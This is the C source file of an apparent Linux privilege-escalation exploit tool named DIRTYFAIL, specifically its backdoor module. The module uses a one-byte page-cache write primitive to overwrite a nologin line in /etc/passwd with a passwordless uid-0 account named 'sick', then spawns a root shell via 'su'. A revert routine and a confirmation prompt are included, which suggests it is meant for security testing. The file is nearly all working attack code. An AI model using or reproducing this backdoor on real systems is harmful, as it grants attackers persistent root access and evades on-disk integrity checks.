/*
 * DIRTYFAIL — backdoor.c
 *
 * Persistent uid-0 backdoor via length-matched /etc/passwd line
 * substitution. See backdoor.h for the design rationale.
 *
 * Flow:
 *
 *   install:
 *     1. parse /etc/passwd, find longest line with nologin/false/sync shell
 *     2. compute replacement "sick::0:0:<pad>:/:/bin/bash" same length
 *     3. snapshot state to /var/tmp/.dirtyfail.state
 *     4. for each byte that differs:
 *          cfg_1byte_write(/etc/passwd, byte_off, new_byte)
 *     5. exec su - sick     (PAM nullok accepts empty password)
 *
 *   cleanup:
 *     1. read state (LINE_OFF, original VICTIM_LINE)
 *     2. read current page-cache bytes at that line
 *     3. for each byte that differs from VICTIM_LINE:
 *          cfg_1byte_write(/etc/passwd, byte_off, original_byte)
 *     4. delete state file
 */

#include "backdoor.h"
#include "copyfail_gcm.h"

#include <fcntl.h>
#include <pwd.h>
#include <sys/stat.h>

#define STATE_FILE   "/var/tmp/.dirtyfail.state"
#define NEW_USER     "sick"
#define SICK_PREFIX  "sick::0:0:"
#define SICK_SUFFIX  ":/:/bin/bash"

/* ---- /etc/passwd line picker ---------------------------------------- *
 *
 * Walk lines, parse to find the shell field (last colon-separated
 * field), accept if shell is one of the canonical "no-login" shells.
 * Pick the longest acceptable line so the replacement has room for
 * padding.
 */

struct victim {
    off_t  line_off;
    size_t line_len;
    char   line[256];
    char   name[64];
};

static bool is_nologin_shell(const char *shell)
{
    static const char *deny[] = {
        "/usr/sbin/nologin",
        "/sbin/nologin",
        "/bin/false",
        "/usr/bin/false",
        "/bin/sync",
        NULL,
    };
    for (size_t i = 0; deny[i]; i++)
        if (strcmp(shell, deny[i]) == 0) return true;
    return false;
}

static bool find_victim(struct victim *v)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { log_bad("open /etc/passwd: %s", strerror(errno)); return false; }
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t n = read(fd, buf, st.st_size);
    close(fd);
    if (n <= 0) { free(buf); return false; }
    buf[n] = '\0';

    bool found = false;
    char *line = buf;
    char *end  = buf + n;
    while (line < end) {
        char *nl = memchr(line, '\n', end - line);
        size_t len = nl ? (size_t)(nl - line) : (size_t)(end - line);
        if (len == 0 || len >= sizeof(v->line)) goto next;

        char tmp[256];
        memcpy(tmp, line, len);
        tmp[len] = '\0';

        /* Last field after final ':' is the shell. */
        char *shell = strrchr(tmp, ':');
        if (!shell) goto next;
        shell++;
        if (!is_nologin_shell(shell)) goto next;

        if (len > v->line_len) {
            v->line_off = line - buf;
            v->line_len = len;
            memcpy(v->line, line, len);
            v->line[len] = '\0';
            char *colon = memchr(v->line, ':', len);
            size_t nlen = colon ? (size_t)(colon - v->line) : len;
            if (nlen >= sizeof(v->name)) nlen = sizeof(v->name) - 1;
            memcpy(v->name, v->line, nlen);
            v->name[nlen] = '\0';
            found = true;
        }
next:
        if (!nl) break;
        line = nl + 1;
    }
    free(buf);
    return found;
}

/* ---- state file ----------------------------------------------------- */

static bool save_state(off_t line_off, const char *victim_line, size_t len)
{
    int fd = open(STATE_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { log_bad("open state: %s", strerror(errno)); return false; }
    char buf[2048];
    int n = snprintf(buf, sizeof(buf), "LINE_OFF=%lld\nVICTIM_LEN=%zu\nVICTIM_LINE=",
                     (long long)line_off, len);
    write(fd, buf, n);
    write(fd, victim_line, len);
    write(fd, "\n", 1);
    close(fd);
    return true;
}

static bool load_state(off_t *line_off, char *victim_line, size_t cap, size_t *len)
{
    int fd = open(STATE_FILE, O_RDONLY);
    if (fd < 0) return false;
    char buf[2048];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return false;
    buf[n] = '\0';

    char *p = strstr(buf, "LINE_OFF=");
    if (!p) return false;
    *line_off = (off_t)strtoll(p + 9, NULL, 10);

    char *v = strstr(buf, "VICTIM_LINE=");
    if (!v) return false;
    v += 12;
    char *end = strchr(v, '\n');
    if (!end) end = buf + n;
    size_t vlen = end - v;
    if (vlen >= cap) return false;
    memcpy(victim_line, v, vlen);
    victim_line[vlen] = '\0';
    *len = vlen;
    return true;
}

/* ---- byte-flip helper ----------------------------------------------- *
 *
 * For each char position where `cur[i] != target[i]`, call the
 * 1-byte primitive to land the new byte. Linear in number of
 * differing bytes; on a typical /etc/passwd line that's ~30-40 flips.
 */

static bool apply_flips(off_t base_off, const char *cur, const char *want, size_t len)
{
    size_t flips = 0;
    for (size_t i = 0; i < len; i++) {
        if (cur[i] == want[i]) continue;
        if (!cfg_1byte_write("/etc/passwd",
                             base_off + i, (unsigned char)want[i])) {
            log_bad("byte flip failed at offset %lld",
                    (long long)(base_off + i));
            return false;
        }
        flips++;
        if ((flips & 7) == 0) putchar('.'), fflush(stdout);
    }
    if (flips) putchar('\n');
    log_step("applied %zu byte flips", flips);
    return true;
}

/* ---- install -------------------------------------------------------- */

df_result_t backdoor_install(bool do_shell)
{
    log_step("Persistent backdoor — install");

    /* Did we already install? Check via getpwnam. */
    struct passwd *pw = getpwnam(NEW_USER);
    if (pw && pw->pw_uid == 0) {
        log_ok("'%s' already in /etc/passwd as uid 0", NEW_USER);
        if (!do_shell) return DF_EXPLOIT_OK;
        log_ok("invoking 'su - %s'", NEW_USER);
        execlp("su", "su", "-", NEW_USER, (char *)NULL);
        return DF_EXPLOIT_FAIL;
    }

    struct victim v;
    memset(&v, 0, sizeof(v));
    if (!find_victim(&v)) {
        log_bad("no nologin victim line found in /etc/passwd");
        return DF_TEST_ERROR;
    }
    log_step("victim line: '%s' at offset %lld (%zu bytes)",
             v.name, (long long)v.line_off, v.line_len);

    /* Build replacement, same length. */
    size_t fixed_len = strlen(SICK_PREFIX) + strlen(SICK_SUFFIX);
    if (v.line_len < fixed_len) {
        log_bad("victim line too short (%zu) for sick replacement (need >= %zu)",
                v.line_len, fixed_len);
        return DF_TEST_ERROR;
    }
    size_t pad_len = v.line_len - fixed_len;
    char target[256];
    char *p = target;
    memcpy(p, SICK_PREFIX, strlen(SICK_PREFIX)); p += strlen(SICK_PREFIX);
    memset(p, 'X', pad_len); p += pad_len;
    memcpy(p, SICK_SUFFIX, strlen(SICK_SUFFIX)); p += strlen(SICK_SUFFIX);
    *p = '\0';

    log_step("replacement:  '%s'", target);
    log_warn("about to length-match overwrite '%s' → '%s' (%zu bytes)",
             v.name, NEW_USER, v.line_len);
    log_warn("ON-DISK /etc/passwd is unchanged. State stashed at %s.", STATE_FILE);
    log_warn("After exit, `su - %s` from any user drops a root shell until cache evicts.",
             NEW_USER);
    if (!typed_confirm("DIRTYFAIL")) {
        log_bad("confirmation declined");
        return DF_OK;
    }

    if (!save_state(v.line_off, v.line, v.line_len)) {
        return DF_TEST_ERROR;
    }

    if (!apply_flips(v.line_off, v.line, target, v.line_len)) {
        return DF_EXPLOIT_FAIL;
    }

    /* Verify */
    if (!(pw = getpwnam(NEW_USER)) || pw->pw_uid != 0) {
        log_bad("post-flip getpwnam(%s) doesn't show uid 0 — install failed",
                NEW_USER);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("'%s' is now uid 0 in the page cache copy of /etc/passwd",
           NEW_USER);
    log_hint("state stashed at %s — run 'dirtyfail --cleanup-backdoor' to revert",
             STATE_FILE);

    if (!do_shell) return DF_EXPLOIT_OK;
    log_ok("invoking 'su - %s' (PAM nullok accepts empty password)", NEW_USER);
    execlp("su", "su", "-", NEW_USER, (char *)NULL);
    log_bad("execlp: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}

/* ---- cleanup -------------------------------------------------------- */

df_result_t backdoor_cleanup(void)
{
    log_step("Persistent backdoor — cleanup");

    off_t line_off = 0;
    char victim_line[256];
    size_t victim_len = 0;
    if (!load_state(&line_off, victim_line, sizeof(victim_line), &victim_len)) {
        log_bad("no usable state file at %s", STATE_FILE);
        return DF_TEST_ERROR;
    }
    log_step("restoring %zu bytes at offset %lld", victim_len, (long long)line_off);

    /* Read the CURRENT bytes (post-install). */
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { log_bad("open passwd: %s", strerror(errno)); return DF_TEST_ERROR; }
    char cur[256];
    if (pread(fd, cur, victim_len, line_off) != (ssize_t)victim_len) {
        log_bad("pread: %s", strerror(errno));
        close(fd); return DF_TEST_ERROR;
    }
    close(fd);

    if (!apply_flips(line_off, cur, victim_line, victim_len)) {
        return DF_EXPLOIT_FAIL;
    }

    unlink(STATE_FILE);
    log_ok("backdoor cleaned — '%s' line restored, state file removed",
           victim_line);

#ifdef POSIX_FADV_DONTNEED
    int e = open("/etc/passwd", O_RDONLY);
    if (e >= 0) { posix_fadvise(e, 0, 0, POSIX_FADV_DONTNEED); close(e); }
#endif
    return DF_OK;
}
